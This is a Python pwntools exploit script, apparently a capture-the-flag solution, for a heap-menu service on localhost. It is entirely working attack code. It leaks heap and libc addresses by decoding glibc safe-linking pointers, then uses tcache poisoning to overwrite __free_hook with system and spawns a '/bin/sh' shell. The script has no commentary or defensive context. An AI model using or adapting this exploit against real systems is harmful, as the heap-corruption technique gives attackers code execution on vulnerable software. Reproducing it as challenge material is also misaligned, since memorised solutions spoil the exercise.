#!/usr/bin/env python3
from pwn import *

s = remote('localhost', 30004)

libc = ELF('./libc.so.6')

def alloc(index, size, content='A'):
    s.sendlineafter('> ', '1')
    s.sendlineafter('Index: ', str(index))
    s.sendlineafter('Size: ', str(size))
    s.sendlineafter('Content: ', content)

def show(index):
    s.sendlineafter('> ', '2')
    s.sendlineafter('Index: ', str(index))
    return s.recvline(False)

def move(src, dest):
    s.sendlineafter('> ', '3')
    s.sendlineafter('(src): ', str(src))
    s.sendlineafter('(dest): ', str(dest))

def copy(src, dest):
    s.sendlineafter('> ', '4')
    s.sendlineafter('(src): ', str(src))
    s.sendlineafter('(dest): ', str(dest))

def reveal(ptr):
    for shift in range(0, 0x30, 0xc)[::-1]:
        ptr = (0xfff << shift & ptr) >> 0xc ^ ptr
    return ptr

def protect(ptr):
    return ptr ^ heap_base >> 0xc

alloc(0, 0x18)
alloc(1, 0x18)
move(0, 0)
for i in range(4):
    copy(1, 0)
    move(0, 0)
heap_base = reveal(u64(show(0).ljust(8, b'\0'))) - 0x2a0
log.info('heap base: %#x' % heap_base)

alloc(1, 0x28, p64(0) * 4 + p64(protect(heap_base + 0x830))[:-2])
alloc(1, 0x70)
for i in range(9):
    alloc(2, 0x70)
alloc(2, 0x28, p64(0) * 4 + p64(protect(heap_base + 0x310))[:-2])
alloc(2, 0x70)
for i in range(9):
    alloc(3, 0x70)
alloc(0, 0x28)
alloc(0, 0x18, p64(protect(heap_base + 0x300)))
alloc(0, 0x18)
alloc(0, 0x18, p64(0) + p64(0x501))
alloc(0, 0x18, p64(0) + p64(0x501))
alloc(0, 0x18)
move(1, 3)
move(2, 3)
alloc(1, 0x28)

libc.address = u64(show(0).ljust(8, b'\0')) - 0x1e4030
log.info('libc base: %#x' % libc.address)

alloc(0, 0x18)
alloc(1, 0x18, p64(0) * 2)
move(0, 0)
for i in range(2):
    copy(1, 0)
    move(0, 0)
alloc(0, 0x18, p64(protect(libc.symbols['__free_hook'])))
alloc(0, 0x18)
alloc(0, 0x18, p64(libc.symbols['system']))
alloc(0, 0x18, '/bin/sh')
move(0, 0)

s.interactive()
